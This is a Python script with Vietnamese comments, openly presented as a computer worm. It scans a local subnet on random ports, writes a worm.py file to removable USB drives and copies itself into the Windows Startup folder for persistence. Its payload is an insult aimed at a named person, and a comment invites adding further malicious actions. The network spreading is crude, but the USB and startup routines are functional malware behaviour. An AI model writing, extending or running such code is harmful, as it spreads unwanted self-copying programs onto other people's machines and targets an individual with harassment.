import os
import socket
import random
import time
import shutil

# Tải trọng của sâu máy tính
payload = "Cẩm Hà là kẻ ngốc!"

# Hàm lây lan qua mạng
def spread_network():
    # Giả định rằng sâu có thể lây lan tới nhiều địa chỉ IP trong mạng cục bộ
    for i in range(1, 255):
        target_ip = f"192.168.1.{i}"  # Địa chỉ IP giả định trong mạng cục bộ
        port = random.randint(10000, 60000)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, port))
            sock.sendall(f"GET /{payload} HTTP/1.1\r\n".encode())
            sock.close()
            print(f"Lây lan thành công qua mạng tới {target_ip}")
        except Exception as e:
            print(f"Không thể kết nối tới {target_ip}: {e}")

# Hàm lây lan qua USB
def spread_usb():
    drives = [f"{chr(drive)}:/" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:/")]
    for drive in drives:
        if 'Removable' in os.popen(f'fsutil fsinfo drivetype {drive}').read():
            worm_code = f"""
import os

# Tải trọng của sâu máy tính
payload = "{payload}"

def execute_payload():
    print("Tải trọng: {payload}")

if __name__ == "__main__":
    execute_payload()
    # Có thể thêm hành động độc hại khác ở đây
"""
            with open(os.path.join(drive, 'worm.py'), 'w') as f:
                f.write(worm_code)
            print(f"Đã sao chép vào USB: {drive}")

# Hàm thêm vào khởi động
def add_to_startup():
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    worm_path = os.path.join(startup_path, "worm.py")
    with open(worm_path, 'w') as f:
        f.write(open(__file__).read())
    print(f"Đã thêm vào khởi động: {worm_path}")

# Hàm chính
def main():
    spread_network()  # Lây lan qua mạng
    spread_usb()      # Lây lan qua USB
    add_to_startup()  # Thêm vào khởi động
    print("Mã đã được lây lan!")

if __name__ == "__main__":
    main()
